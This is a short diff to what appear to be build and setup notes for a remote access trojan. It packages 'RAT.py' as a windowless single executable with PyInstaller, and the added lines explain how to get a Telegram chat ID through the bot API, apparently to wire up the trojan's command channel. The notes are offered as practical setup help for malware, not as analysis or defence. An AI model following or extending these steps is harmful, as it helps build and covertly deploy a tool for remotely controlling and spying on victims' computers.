@@ -4,3 +4,9 @@ pip3 uninstall -y enum34
 pip3 install PyAudio-0.2.11-cp38-cp38-win_amd64.whl
 pip3 install PyInstaller-3.6-py2.py3-none-any.whl
 pyinstaller -w -F RAT.py
+
+
+GET- Chat_ID
+1- send massege to bot /my_id @my_bot
+
+3- Go to following url: https://api.telegram.org/botXXX:YYYY/getUpdates   XXX:YYYY - your bot token
